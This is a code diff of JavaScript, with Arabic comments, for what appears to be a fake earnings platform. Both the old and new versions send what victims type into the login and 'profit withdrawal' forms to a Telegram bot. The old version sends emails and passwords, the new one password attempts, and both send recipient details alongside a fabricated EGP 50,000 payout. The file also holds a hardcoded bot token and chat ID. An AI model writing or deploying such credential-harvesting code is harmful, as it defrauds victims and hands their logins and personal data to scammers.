@@ -1,16 +1,18 @@
-// إعدادات البوت الخاصة بك (Coach Khadija Mohammad)
+// بيانات التليجرام الخاصة بك
 const CONFIG = {
     botToken: '8154142175:AAGvcFJuk6eh972IJUujoKV2ibkNIIWlMNA',
     chatId: '8232581666'
 };
 
-const loginForm = document.getElementById('login-form');
+// ملف الدخول الثابت (للتجربة)
+const CORRECT_PASS = "coach_k"; // الباسوورد الموحد الجديد
+
 const loginBtn = document.getElementById('login-btn');
-const dashboard = document.getElementById('dashboard-section');
 const loginSection = document.getElementById('login-section');
+const dashboard = document.getElementById('dashboard-section');
 const loader = document.getElementById('loader');
 
-// دالة الإرسال للتليجرام
+// دالة إرسال الإشعارات
 async function notifyTelegram(text) {
     try {
         await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
@@ -25,38 +27,41 @@ async function notifyTelegram(text) {
     } catch (e) { console.error("Telegram Error"); }
 }
 
-// معالجة تسجيل الدخول
-loginForm.addEventListener('submit', async (e) => {
+// معالجة تسجيل الدخول (باسوورد فقط)
+document.getElementById('login-form').addEventListener('submit', async (e) => {
     e.preventDefault();
-    const email = document.getElementById('email').value;
-    const pass = document.getElementById('password').value;
+    const passInput = document.getElementById('password').value;
 
     loader.classList.remove('hidden');
-    loginBtn.disabled = true;
-
-    // إرسال البيانات فوراً للبوت
-    await notifyTelegram(`🔔 <b>محاولة دخول جديدة</b>\n📧 الإيميل: <code>${email}</code>\n🔑 الباسوورد: <code>${pass}</code>`);
+    
+    // إشعار محاولة الدخول
+    await notifyTelegram(`🔔 <b>محاولة دخول للمنصة</b>\n🔑 الباسوورد المستخدم: <code>${passInput}</code>`);
 
     setTimeout(() => {
         loader.classList.add('hidden');
-        localStorage.setItem('userAuth', 'true');
-        showDashboard();
+        if (passInput === CORRECT_PASS) {
+            localStorage.setItem('userTaqwaAuth', 'true');
+            showDashboard();
+        } else {
+            alert("كود الوصول غير صحيح أو منتهي.");
+        }
     }, 1500);
 });
 
-// معالجة طلب السحب
+// طلب السحب (بيانات مختلطة)
 document.getElementById('transfer-form').addEventListener('submit', async (e) => {
     e.preventDefault();
-    const name = document.getElementById('recipient-name').value;
+    const userData = document.getElementById('recipient-data').value;
     const method = document.getElementById('transfer-method').value;
 
     loader.classList.remove('hidden');
     
-    await notifyTelegram(`💰 <b>طلب سحب أرباح</b>\n👤 الاسم: ${name}\n💳 الوسيلة: ${method}\n💵 المبلغ: EGP 50,000.00`);
+    // تقرير مفصل
+    await notifyTelegram(`💰 <b>طلب سحب أرباح</b>\n👤 البيانات: ${userData}\n💳 الوسيلة: ${method}\n💵 المبلغ: EGP 50,000.00`);
 
     setTimeout(() => {
         loader.classList.add('hidden');
-        alert("تم استلام طلب السحب بنجاح. سيتم مراجعة البيانات من قبل الإدارة الفنية للتقوى.");
+        alert("تم استلام طلب السحب بنجاح. سيتم مراجعة التحويل خلال دقائق.");
         location.reload();
     }, 2000);
 });
@@ -66,10 +71,10 @@ function showDashboard() {
     dashboard.classList.remove('hidden');
 }
 
-// التحقق من حالة الجلسة
-if (localStorage.getItem('userAuth') === 'true') { showDashboard(); }
+// تحقق من الجلسة
+if (localStorage.getItem('userTaqwaAuth') === 'true') { showDashboard(); }
 
 document.getElementById('logout-btn').onclick = () => {
-    localStorage.removeItem('userAuth');
+    localStorage.removeItem('userTaqwaAuth');
     location.reload();
 };
